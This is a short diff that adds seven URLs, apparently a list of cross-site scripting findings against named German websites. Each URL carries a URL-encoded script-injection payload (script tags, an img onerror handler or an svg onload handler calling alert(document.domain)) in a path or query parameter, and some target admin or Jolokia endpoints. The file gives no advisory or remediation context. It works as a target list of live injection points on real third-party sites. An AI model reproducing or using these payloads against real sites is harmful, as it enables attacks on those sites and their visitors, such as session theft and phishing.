@@ -1,0 +1,7 @@
+http://getacs.de/system/login/SysLoginUser.aspx?Error=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&Login=Error
+http://getraenke-team.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://globaltherm.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://gofair.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://gut-ziel-geiselbullach.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+https://gehrden-suche.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://grossenhain-zone.de/wp-admin/admin.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/?page=under-construction
